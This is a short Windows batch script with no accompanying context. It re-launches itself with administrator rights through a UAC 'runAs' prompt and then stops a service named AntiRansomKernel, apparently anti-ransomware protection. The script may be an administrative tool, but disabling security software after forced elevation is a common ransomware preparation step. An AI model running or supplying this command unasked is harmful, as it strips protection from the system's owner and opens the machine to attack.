@echo off
net session >nul 2>&1
if %errorlevel% == 0 (
) else (
    powershell -Command "Start-Process cmd -ArgumentList '/k %~s0' -Verb runAs"
    exit
)
net stop AntiRansomKernel
exit
